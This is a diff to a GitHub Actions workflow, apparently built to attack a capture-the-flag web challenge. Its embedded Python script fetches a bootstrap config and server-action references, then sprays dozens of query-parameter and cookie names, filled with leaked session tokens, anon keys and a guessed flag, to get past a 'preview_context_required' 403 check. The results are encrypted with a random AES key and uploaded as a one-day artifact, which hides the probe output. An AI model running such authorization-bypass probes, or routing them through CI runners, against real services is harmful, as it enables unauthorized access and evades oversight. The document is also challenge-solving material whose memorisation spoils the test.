@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Probe action authentication/context ordering
+      - name: Bulk probe query and cookie preview context carriers
         shell: bash
         run: |
           set -euo pipefail
@@ -33,22 +33,24 @@ jobs:
           import requests, pathlib, urllib.parse, json
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
           out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
-          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint']); body={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}
-          api=boot['client']['anonKey']; sess=boot['client']['session']
-          tests=[
-            ('none',{}),('accept',{'Accept':'application/json'}),('ctype',{'Content-Type':'application/json'}),('accept_ctype',{'Accept':'application/json','Content-Type':'application/json'}),
-            ('apikey',{'apikey':api}),('authorization',{'Authorization':'Bearer '+sess}),('both',{'apikey':api,'Authorization':'Bearer '+sess}),
-            ('api_ctype',{'apikey':api,'Content-Type':'application/json'}),('auth_ctype',{'Authorization':'Bearer '+sess,'Content-Type':'application/json'}),
-            ('session_header',{'X-Launchlet-Session':sess}),('preview_session_header',{'X-Launchlet-Preview-Session':sess}),
-            ('auth_raw',{'Authorization':sess}),('auth_preview',{'Authorization':'Preview '+sess}),('auth_launchlet',{'Authorization':'Launchlet '+sess}),
-          ]
-          res=[]
-          for name,h in tests:
-              try:
-                  r=s.post(url,headers=h,json=body,timeout=15,allow_redirects=False)
-                  res.append({'name':name,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
-              except Exception as e: res.append({'name':name,'error':repr(e)})
-          (out/'summary.json').write_text(json.dumps(res,indent=2))
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint']); body={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}
+          keys=['preview','preview_context','previewContext','context','context_id','contextId','preview_token','previewToken','token','preview_session','previewSession','session','scope','capability','preview_capability','previewCapability','mode','stage','environment','source','role','client','runtime','studio','preview_mode','previewMode','request_context','requestContext','client_context','clientContext','runtime_context','runtimeContext']
+          values=['preview','1','true','enabled','active','yes','on','guest','public','studio','browser','live','sandbox','internal',boot['client']['session'],boot['client']['anonKey'],boot['project'],boot['workspace'],mf['build'],mf['previewReceipt'],act['id'],refs['runtime'],'preview:guest','preview:public','preview:receipt:read','caplag{preview_manifest_kept_the_receipt}']
+          baseh={'Accept':'application/json','Content-Type':'application/json'}; baseline=(403,'{"error":"preview_context_required"}'); hits=[]
+          for val in values:
+              params={k:val for k in keys}
+              r=s.post(url+'?'+urllib.parse.urlencode(params),headers=baseh,json=body,timeout=15,allow_redirects=False)
+              if (r.status_code,r.text.strip())!=baseline:
+                  hits.append({'carrier':'query','value':val,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+                  if r.status_code==200 or 'caplag{' in r.text: break
+          if not any(x['status']==200 or 'caplag{' in x['body'] for x in hits):
+              for val in values:
+                  cookies={k:val for k in keys}
+                  r=s.post(url,headers=baseh,cookies=cookies,json=body,timeout=15,allow_redirects=False)
+                  if (r.status_code,r.text.strip())!=baseline:
+                      hits.append({'carrier':'cookie','value':val,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+                      if r.status_code==200 or 'caplag{' in r.text: break
+          (out/'summary.json').write_text(json.dumps({'hits':hits},indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -64,6 +66,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-auth-encrypted
+          name: launchlet-part2-querycookie-encrypted
           path: artifact/
           retention-days: 1
